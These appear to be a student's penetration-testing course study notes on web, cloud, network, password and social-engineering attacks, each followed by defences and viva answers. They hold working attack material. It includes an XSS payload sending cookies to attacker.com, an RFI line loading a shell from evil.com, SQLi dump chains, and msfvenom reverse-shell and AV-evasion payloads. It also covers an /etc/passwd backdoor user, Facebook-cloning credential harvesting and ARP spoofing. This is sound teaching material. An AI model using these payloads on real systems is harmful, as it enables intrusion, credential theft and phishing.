---
tags:
  - int245
  - study-notes
  - pentest
  - cyber-security
aliases:
  - INT245 Study Notes
---

# 📚 INT245 Comprehensive Study Notes

<- Back to [[INT245_Dashboard|Master Dashboard]]

> [!info] About These Notes
> These notes are compiled from all INT245 course materials — PPT slides (M04, M05, M06), lab guides, DOCX references, practicals, and viva prep. Structured for exam-ready revision.

---

## 1. Web-based Attacks
Web applications are prime targets due to their public accessibility and complexity.

> [!tip] Attack Surface
> Entry points include uploads, URL parameters, headers, cookies, form inputs, and API calls.

### Brute-Force & Collision Attacks
- **Brute-Force:** Systematically guessing credentials by trying every combination. Tools: `Hydra`, `Burp Suite Intruder`.
- **Credential Stuffing:** Reusing leaked username/password combos from data breaches against other services.
- **Collision Attack:** Exploits hash function weaknesses where two different inputs produce the same hash, undermining integrity checks (MD5 is vulnerable).
- **Password Spraying:** Trying a single common password (e.g., `Password123`) against many accounts to avoid lockout.

### Directory Traversal
- Abuses weak file path handling to access files outside the intended web root.
- Payload example: `../../../../etc/passwd`
- The `../` (dot-dot-slash) moves up one directory level.
- **Defence:** Sanitize and validate all file path inputs; use an allow-list of permitted filenames.

### Request Forgery Attacks
- **Cross-Site Request Forgery (CSRF):**
  - Exploits a website's trust in an authenticated user's browser.
  - Tricks the victim into submitting a malicious request (e.g., change email/password) while logged in.
  - **Defence:** Use CSRF tokens (unpredictable, session-bound), `SameSite` cookie attribute.
- **Server-Side Request Forgery (SSRF):**
  - Tricks the server itself into making HTTP requests to internal/restricted resources.
  - Classic target: Cloud metadata service at `http://169.254.169.254/` — leaks temporary IAM credentials.
  - Can be used to port-scan internal networks from the server.
  - **Defence:** Block requests to internal IP ranges; use allow-lists for external URLs.

### Deserialization Attacks
- **Serialization:** Converting objects (e.g., Python dict, Java object) into a storable format (JSON, XML, binary).
- **Unsafe Deserialization:** Processing untrusted serialized data can lead to **Remote Code Execution (RCE)**.
- Root cause: App deserializes attacker-controlled data without validation, allowing object manipulation.
- **Defence:** Never deserialize untrusted data; use integrity checks; prefer JSON over binary formats.

### Injection Attacks
Malicious input is sent to an interpreter (SQL engine, shell, template engine) as part of a command or query.

> [!important] Core Principle
> All injection vulnerabilities share the same root cause: **mixing untrusted user data with trusted code/commands**.

#### SQL Injection (SQLi)
The most common and impactful injection vulnerability. Attacker manipulates a backend SQL query.

**How it works:**
```sql
-- Original query built by the app
SELECT * FROM users WHERE username='INPUT' AND password='INPUT';

-- Attacker enters: ' OR 1=1 -- -
-- Final query becomes:
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='anything';
-- OR 1=1 is always TRUE → returns all users → logs in as first user (admin)
```

**Full SQLi Enumeration Chain (UNION-based):**
```sql
-- Step 1: Determine number of columns
1 ORDER BY 1 #
1 ORDER BY 2 #  -- increment until error to find column count

-- Step 2: Find injectable columns and get DB name
1' UNION SELECT null, database() #

-- Step 3: Get all table names in the database
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='dvwa' #

-- Step 4: Get column names from a specific table
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #

-- Step 5: Dump credentials
1' UNION SELECT user, password FROM users #
```

**SQLMap (Automated Tool):**
```bash
sqlmap -u "http://target.com/page?id=1" --dbs          # list databases
sqlmap -u "http://target.com/page?id=1" -D dvwa --tables # list tables
sqlmap -u "http://target.com/page?id=1" -D dvwa -T users --dump # dump table
```

**Defence:** Use **Parameterized Queries (Prepared Statements)** — treats user input as data, not executable code.

#### Command Injection
- Attacker sends OS commands through an unsanitized input field.
- Common in apps that use `system()`, `exec()`, `popen()` to run shell commands.

**Payloads used in lab:**
```bash
127.0.0.1           # normal ping
127.0.0.1; ls       # execute 'ls' after ping
127.0.0.1; whoami   # check running user
127.0.0.1; uname -a # kernel info
127.0.0.1; cat /etc/passwd  # read sensitive file
```

#### Cross-Site Scripting (XSS)
Injects malicious JavaScript into a web page, which executes in the victim's browser.

| Type | How it works | Persistence |
|---|---|---|
| **Reflected** | Payload is in URL, bounced off server in response | Non-persistent |
| **Stored/Persistent** | Payload is saved in DB, served to all users | Persistent |
| **DOM-based** | Payload is handled entirely by client-side JS, never reaches server | Client-side |

**Basic payload:** `<script>alert('XSS')</script>`
**Cookie stealing:** `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
**Defence:** Encode output (HTML entity encoding); use Content Security Policy (CSP); validate input.

#### Server-Side Template Injection (SSTI)
- Abuses template engines (Jinja2, Twig, Freemarker) when user input is rendered as a template expression.
- Example: Input `{{7*7}}` renders as `49` — confirming SSTI.
- Can escalate to full RCE by executing system commands through the template engine.
- **Defence:** Never pass raw user input to template engines; use sandboxed rendering.

### Access & Session Flaws

#### Insecure Direct Object Reference (IDOR)
- App exposes internal object references (DB IDs, filenames) directly in URLs/parameters.
- Attack: User changes `user_id=1` → `user_id=2` in URL or POST body to access another user's data.
- Can also occur in JSON bodies, cookies, and API parameters.
- **Defence:** Implement server-side authorization checks; use indirect references (GUIDs instead of sequential IDs).

#### Session Hijacking
HTTP is stateless — sessions are tracked using **Session IDs (SIDs)** stored in cookies.

- **Session Fixation:** Attacker sets a known SID before the user logs in; after login, attacker uses the same SID to impersonate the user.
- **Session Replay:** Intercepted SID is replayed to authenticate as the victim.
- **Tools:** OWASP ZAP, Burp Suite (proxy-based interception).
- **Defence:** Regenerate SID on login; use `HttpOnly` and `Secure` cookie flags; set short session timeouts.

#### Arbitrary Code Execution
Exploits flaws to run attacker-controlled code on the target system.
- **Causes:** Unsanitized input, buffer overflow, unsafe deserialization.
- **Buffer Overflow:** Writes data past a memory buffer's boundary, overwriting adjacent memory to redirect execution.
- Vector for RCE via SQLi, XSS, or command injection.

#### File Inclusions
Abuse `include()` / `require()` functions in PHP to load unauthorized files.

| Type | Target | Example |
|---|---|---|
| **LFI (Local File Inclusion)** | Files already on the server | `?page=../../../../etc/passwd` |
| **RFI (Remote File Inclusion)** | Files hosted on attacker's server | `?page=http://evil.com/shell.php` |

**Impact:** Code execution, web shell upload, data theft, full system compromise.
**Defence:** Validate all file path inputs; disable `allow_url_include` in PHP.

### API & JWT Abuse

#### API Abuse
APIs (REST, SOAP, XML-RPC) are interfaces for client-server data exchange.

- **Parameter Tampering:** Modify request parameters to access/modify unauthorized data.
- **Injection via API:** SQLi and command injection through API parameters.
- **DoS:** Hammer endpoints without rate limiting.
- **Brute-force Auth:** Attack login/token endpoints.
- **Defence:** Rate limiting, authentication on all endpoints, input validation, proper error handling.

#### JSON Web Token (JWT) Manipulation
JWTs are Base64-encoded, signed tokens used for stateless authentication.

**Structure:** `Header.Payload.Signature`
- **Header:** Algorithm type (`alg`) and token type (`typ`)
- **Payload:** Claims (user ID, roles, expiry)
- **Signature:** Verifies the token wasn't tampered with

**Attacks:**
| Attack | Description |
|---|---|
| **None Algorithm** | Set `alg: none` in header to bypass signature verification |
| **Algorithm Confusion** | Switch from RS256 to HS256, sign with server's public key |
| **"kid" Manipulation** | Inject SQL/directory traversal into Key ID parameter |
| **Signature Forgery** | Forge tokens if the secret key is weak or leaked |

**Risks:** User impersonation, privilege escalation, data leakage.
**Defence:** Validate the algorithm server-side; use strong, random secrets; reject `none` algorithm.

---

## 2. Cloud-based Attacks
Cloud models (SaaS, PaaS, IaaS) face all traditional web attack types plus cloud-specific threats.

> [!warning] Cloud Attack Impact
> Data breaches in cloud environments can cause financial loss, IP theft, regulatory fines, and legal issues.

- **Metadata Service Attacks:**
  - Instance Metadata Service (IMS) at `http://169.254.169.254/` gives cloud VMs their config and **temporary IAM credentials**.
  - If the web app is SSRF-vulnerable, attacker can hit the IMS and steal credentials to escalate privileges in the cloud account.
  - Example: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

- **IAM Misconfiguration:**
  - Over-permissive roles (e.g., `AdministratorAccess` on a worker function) allow unauthorized lateral movement.
  - **Principle of Least Privilege** must be enforced.

- **Resource Misconfiguration:**
  - Publicly exposed storage buckets (AWS S3, Azure Blob, GCP Storage) can be accessed without auth.
  - Misconfigured security groups/firewalls expose internal services to the internet.

- **Workload & Container Attacks:**
  - **Container Escape:** Techniques like Leaky Vessels and Dirty Pipe exploit kernel or container runtime bugs to break out of a container and access the host OS.
  - Misconfigured `privileged` containers allow direct host access.

---

## 3. Scanning and Vulnerability Discovery

> [!tip] Best Practice
> Combine authenticated scans (deep, credentialed access) and unauthenticated scans (public-facing perspective) for a complete assessment.

### Nmap — Network Mapper

Nmap is the premier open-source tool for network scanning, host discovery, and service enumeration.

**Core Scan Types:**
```bash
nmap 192.168.1.1                  # Default scan (top 1000 ports, SYN)
nmap -sS 192.168.1.1              # SYN (stealth) scan
nmap -sV 192.168.1.1              # Service version detection
nmap -O 192.168.1.1               # OS detection
nmap -A 192.168.1.1               # Aggressive (OS+version+scripts+traceroute)
nmap -p- 192.168.1.1              # All 65535 ports
nmap -p 22,80,443 192.168.1.1     # Specific ports
nmap -sU 192.168.1.1              # UDP scan
nmap 192.168.1.0/24               # Entire subnet
```

**Nmap Scripting Engine (NSE):**
NSE allows automating tasks using Lua scripts. Scripts are categorized as: `auth`, `brute`, `default`, `discovery`, `exploit`, `vuln`, etc.

```bash
nmap --script=vuln 192.168.1.1         # Run all vulnerability scripts
nmap --script=http-enum 192.168.1.1    # Enumerate web directories
nmap --script=ftp-anon 192.168.1.1     # Check for anonymous FTP
nmap --script=smtp-brute 192.168.1.1   # Brute-force SMTP
nmap --script=banner 192.168.1.1       # Banner grabbing
nmap -sV --script=vulners 192.168.1.1  # CVE lookup using Vulners DB
```

**Output Formats:**
```bash
nmap -oN output.txt 192.168.1.1   # Normal output
nmap -oX output.xml 192.168.1.1   # XML output
nmap -oG output.gnmap 192.168.1.1 # Grepable output
nmap -oA output 192.168.1.1       # All formats at once
```

### Other Scanning Tools

- **OpenVAS / Nessus:** Comprehensive vulnerability scanners that perform credentialed scans and generate CVE-mapped reports.
- **TruffleHog:** Scans Git repositories, CI/CD configs, and log files for exposed secrets, API keys, and passwords.
- **Aircrack-ng suite:**
  - `airmon-ng start wlan0` — puts wireless adapter in monitor mode
  - `airodump-ng wlan0mon` — captures wireless traffic and discovers hidden SSIDs
  - `aircrack-ng -w wordlist.txt capture.cap` — cracks WPA2 handshakes offline

### Scripting & Automation
- **Bash:** Automate repetitive recon tasks — port sweeping, log parsing, alert generation.
- **PowerShell:** Windows-native scripting for Active Directory enumeration and system administration.
- **Python:** Custom exploit development, packet crafting (`Scapy`), protocol analysis (`Impacket`), and automation.

---

## 4. Exploitation and Metasploit

> [!important] The Metasploit Framework (MSF)
> `msfconsole` is the primary interactive interface for loading exploits, configuring payloads, and launching attacks.

### Core Terminology

| Term | Definition |
|---|---|
| **Exploit** | Code that takes advantage of a specific vulnerability |
| **Payload** | Code executed on the target *after* successful exploitation |
| **Module** | Reusable component (exploit, auxiliary, post, payload, encoder, nop) |
| **Session** | Active connection to a compromised target (shell or Meterpreter) |
| **Listener** | Process waiting for incoming connections from reverse payloads |

### Shell Types

| Type | How it works | Advantage |
|---|---|---|
| **Reverse Shell** | Target connects *back* to attacker | Bypasses inbound firewall rules |
| **Bind Shell** | Target opens a port, attacker connects *to* target | Simple but blocked by inbound firewalls |
| **Meterpreter** | Advanced in-memory shell with full feature set | Keylogging, file download, pivot, screenshot |

> [!tip] Reverse shells are preferred because outbound traffic is rarely blocked by firewalls.

### Metasploit Workflow
```bash
msfconsole                          # Launch MSF
search vsftpd                       # Search for an exploit module
use exploit/unix/ftp/vsftpd_234_backdoor  # Select the module
info                                # Show module details
show options                        # Show required settings
set RHOSTS 192.168.1.100           # Set target IP
set RPORT 21                       # Set target port
exploit (or run)                    # Launch the attack
```

### vsftpd 2.3.4 Backdoor (Lab Practical)
The vsftpd 2.3.4 backdoor was a maliciously planted backdoor in the source code. Triggering it by sending `:)` as part of the username on port 21 opens a bind shell on port **6200**.

```bash
# In msfconsole:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101   # Metasploitable 2 IP
exploit
# → Opens command shell (uid=root)
```

### msfvenom — Payload Generation
`msfvenom` creates standalone payload files (executables, scripts) to deliver shells without needing Metasploit running.

```bash
# Windows reverse TCP Meterpreter (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell (ELF)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf

# PHP webshell
msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# Encode to evade AV
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

**Setting up the listener:**
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit -j   # run as background job
```

### Useful Meterpreter Commands
```bash
sysinfo          # System info
getuid           # Current user
getsystem        # Attempt privilege escalation
hashdump         # Dump password hashes
shell            # Drop into native shell
upload file.exe  # Upload file to target
download /etc/passwd  # Download from target
screenshot       # Capture screen
keyscan_start    # Start keylogger
run post/windows/gather/enum_logged_on_users  # Post-exploitation
```

---

## 5. OSINT and Reconnaissance
Open-Source Intelligence (OSINT) is the collection of information from publicly available sources *before* any active attack.

> [!note] Passive vs Active Recon
> **Passive:** No direct contact with the target (search engines, social media, DNS records).
> **Active:** Direct contact with target systems (port scanning, banner grabbing). Detectable.

### DNS Enumeration
```bash
nslookup example.com              # Basic DNS lookup
nslookup -type=MX example.com    # Mail server records
nslookup -type=NS example.com    # Nameserver records
dig example.com ANY               # All DNS records
dig axfr @ns1.example.com example.com  # Zone transfer attempt (if misconfigured)
```

**Key DNS Record Types:**
| Record | Purpose |
|---|---|
| A | IPv4 address |
| AAAA | IPv6 address |
| MX | Mail server |
| NS | Name server |
| CNAME | Canonical name (alias) |
| TXT | SPF, DKIM, verification |

### User & Identity Profiling
- **Sherlock:** `python3 sherlock.py username` — searches hundreds of platforms for a username.
- **theHarvester:** Collects emails, usernames, subdomains from Google, Bing, and LinkedIn.
- **Maltego:** Visual link-analysis tool for mapping relationships between entities.

### Tech Stack Fingerprinting
- **WhatWeb:** `whatweb target.com` — identifies CMS, web server, JS frameworks, analytics.
- **Wappalyzer:** Browser extension that identifies technologies on any site in real time.
- **BuiltWith:** Online service for deep technology stack analysis including historical data.

### WAF & Infrastructure Detection
- **wafw00f:** `wafw00f target.com` — detects and identifies Web Application Firewalls (Cloudflare, AWS WAF, etc.).
- **Shodan:** Search engine for internet-connected devices; finds open ports, banners, and vulnerable services.

### OSINT Recon Lab (from OSINT_Recon_Guide.docx)
```bash
# Install tools
sudo apt install theharvester sherlock -y

# Harvest emails and subdomains
theharvester -d target.com -b google,bing,linkedin -l 200

# Find username across platforms
python3 sherlock.py targetusername

# WAF detection
wafw00f https://target.com

# Tech stack
whatweb https://target.com
```

---

## 6. Password Attacks

### John the Ripper
John the Ripper (JtR) is a versatile offline password cracker.

```bash
# Crack /etc/shadow passwords
john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow

# Crack with rules (mangling)
john --wordlist=wordlist.txt --rules /etc/shadow

# Show cracked passwords
john --show /etc/shadow

# Crack specific format
john --format=md5 --wordlist=wordlist.txt hashes.txt
```

**Attack Modes:**
| Mode | Description |
|---|---|
| **Dictionary** | Try words from a wordlist |
| **Rules** | Apply mangling rules to wordlist words (append numbers, capitalize, etc.) |
| **Brute-Force (Incremental)** | Try every possible character combination |
| **Single Crack** | Uses GECOS info from passwd file to guess likely passwords |

### OpenSSL Password Hashing
```bash
# Generate MD5-based crypt hash (for /etc/shadow)
openssl passwd -1 "mypassword"

# Generate SHA-512 hash
openssl passwd -6 "mypassword"

# Generate with specific salt
openssl passwd -1 -salt mysalt "mypassword"
```

**Adding a backdoor user (root-equivalent):**
```bash
# Generate hash
openssl passwd -1 "hacked123"
# Append to /etc/passwd
echo "hacker:$1$xyz$abc...:0:0:root:/root:/bin/bash" >> /etc/passwd
```

---

## 7. Social Engineering Toolkit (SET) & Session Hijacking

### SET (Social-Engineer Toolkit)
SET is a Python-based framework for social engineering attacks.

**Launching SET:**
```bash
sudo setoolkit
```

**Lab Workflow (Credential Harvesting):**
1. `1` → Social-Engineering Attacks
2. `2` → Website Attack Vectors
3. `3` → Credential Harvester Attack Method
4. `2` → Site Cloner
5. Enter attacker IP (`LHOST`)
6. Enter target URL to clone (e.g., `https://facebook.com`)
7. SET hosts a fake copy; credentials submitted are captured in the terminal

**Malicious Payload via USB/PowerShell:**
```bash
# In SET:
1 → Social-Engineering Attacks
4 → Create a Payload and Listener
2 → Windows Reverse_TCP Meterpreter
# SET generates an .exe file and auto-starts listener
```

### Session Hijacking Lab
```bash
# Using Bettercap for ARP poisoning + session capture
sudo bettercap -iface eth0
net.probe on           # Discover hosts
set arp.spoof.targets 192.168.1.5  # Target IP
arp.spoof on           # Start ARP poisoning
net.sniff on           # Capture traffic (sessions visible in cleartext on HTTP)
```

---

## 8. Physical Security
Physical security is often the weakest link — the most sophisticated technical defences can be bypassed with physical access.

| Attack | Description | Mitigation |
|---|---|---|
| **Tailgating** | Following authorized person through a door without badging in | Mantraps, security awareness training |
| **Piggybacking** | With knowledge/consent of the authorized person (insider threat enablement) | Policy enforcement, reporting culture |
| **USB Drop** | Leaving malicious USB drives in parking lots, lobbies | Disable USB autorun, user awareness |
| **Badge Cloning** | Copying unencrypted RFID credentials (e.g., 125kHz EM4100 cards) | Use encrypted MIFARE cards, 2FA entry |
| **Shoulder Surfing** | Observing screen/keyboard to capture credentials | Privacy screens, clean desk policy |
| **Dumpster Diving** | Recovering sensitive documents from trash | Shredding policy, data classification |

---

## 9. Networking Fundamentals for Penetration Testing

### Key Protocols & Ports
| Port | Protocol | Notes |
|---|---|---|
| 21 | FTP | Often misconfigured; vsftpd backdoor on 2.3.4 |
| 22 | SSH | Brute-forceable with Hydra |
| 23 | Telnet | Cleartext; deprecated |
| 25 | SMTP | Email relay; can be abused |
| 53 | DNS | Zone transfer attacks |
| 80/443 | HTTP/HTTPS | Web attack surface |
| 139/445 | SMB | EternalBlue, pass-the-hash |
| 3306 | MySQL | Default DB port |
| 3389 | RDP | Brute-force target on Windows |

### Metasploitable 2 — Lab Environment
Metasploitable 2 is an intentionally vulnerable Linux VM used for practice.

**Key Vulnerabilities:**
- **vsftpd 2.3.4 backdoor** (port 21) → root shell
- **UnrealIRCd backdoor** (port 6667) → command execution
- **Samba ms08-067** (port 445) → remote root
- **DVWA (Damn Vulnerable Web App)** → SQL injection, XSS, command injection, CSRF
- **Mutillidae** → OWASP Top 10 vulnerabilities
- **phpMyAdmin** (weak creds: `root:`) → DB access

---

## 10. Viva Questions & Explanations

> [!question]- Q1: What is the difference between a bind shell and a reverse shell?
> **Bind Shell:** Target opens a listening port; attacker connects inbound to it. Blocked by inbound firewall rules.
> **Reverse Shell:** Target connects *outbound* to attacker. Bypasses inbound firewalls as outbound traffic is rarely restricted. Preferred in real-world pentests.

> [!question]- Q2: How does SQL Injection work and how is it mitigated?
> SQLi occurs when user input is concatenated directly into a SQL query. The attacker alters the query logic (e.g., `' OR 1=1 -- -`) to bypass authentication or extract data.
> **Mitigation:** Use **Parameterized Queries (Prepared Statements)** which treat input as data, not code. Also use input validation and WAFs.

> [!question]- Q3: Explain SSRF and why cloud metadata services are a prime target.
> SSRF tricks a web server into making requests on the attacker's behalf to internal resources. Cloud metadata at `169.254.169.254` provides **temporary IAM credentials** — an SSRF-vulnerable cloud app can expose these, giving the attacker full cloud account access.

> [!question]- Q4: What are the three types of XSS?
> 1. **Reflected:** Payload in URL, immediately returned in response — requires tricking victim into clicking a malicious link.
> 2. **Stored/Persistent:** Payload saved in DB and served to all visitors — most dangerous.
> 3. **DOM-based:** Payload processed entirely by client-side JavaScript, never hits the server.

> [!question]- Q5: What is IDOR and how does it differ from a privilege escalation vulnerability?
> **IDOR (Insecure Direct Object Reference):** App exposes internal object IDs in URLs/parameters and doesn't check if the requesting user is authorized to access that object. e.g., changing `?id=1` to `?id=2`.
> **Privilege Escalation:** Gaining higher-level access than currently authorized (e.g., user → admin). IDOR is often a horizontal escalation (accessing another user's data at the same privilege level).

> [!question]- Q6: What is CSRF and how does a CSRF token mitigate it?
> CSRF exploits a site's trust in an authenticated user's browser — the attacker crafts a malicious request that the victim's browser sends automatically (with their valid session cookie).
> **CSRF token:** A unique, unpredictable, session-bound value included in every state-changing form. Since the attacker can't read the victim's token, they can't forge valid requests.

> [!question]- Q7: Explain the JWT `none` algorithm attack.
> JWTs include the signing algorithm in their header. If the server doesn't validate that the algorithm is an expected value, an attacker can set `"alg": "none"` and remove the signature entirely. The server accepts the unsigned token as valid.
> **Fix:** Always whitelist accepted algorithms server-side; never accept `none`.

> [!question]- Q8: What is the Nmap Scripting Engine (NSE)?
> NSE allows Lua-based scripts to automate Nmap tasks: vulnerability scanning, backdoor detection, brute-forcing, and service enumeration. Scripts are categorized (`auth`, `vuln`, `brute`, `exploit`, etc.) and run with `--script=<name>`.

> [!question]- Q9: Explain LFI vs RFI.
> **LFI (Local File Inclusion):** Includes a file already on the server. Used to read `/etc/passwd`, log files, or SSH keys. Can lead to RCE via log poisoning.
> **RFI (Remote File Inclusion):** Includes a file hosted on the attacker's server. Requires `allow_url_include=On` in PHP. Directly leads to RCE by including a remote PHP webshell.

> [!question]- Q10: How does a buffer overflow lead to code execution?
> Programs allocate fixed-size memory buffers. If the program doesn't validate input length, an attacker can write data past the buffer boundary, overwriting the return address on the stack. By pointing the return address to attacker-controlled shellcode, arbitrary code executes when the function returns.

> [!question]- Q11: What is the difference between authentication and authorization?
> **Authentication:** Verifies *who* the user is (identity). e.g., username + password login.
> **Authorization:** Verifies *what* the authenticated user is *allowed to do*. e.g., can this user access `/admin`?
> A flaw in authorization leads to IDOR, privilege escalation, and broken access control vulnerabilities.

> [!question]- Q12: What is tailgating and how is it prevented?
> Tailgating is following an authorized person through a secured door without using your own credentials. Prevented by **mantraps** (double-door entry systems that only allow one person at a time), security guards, and awareness training.
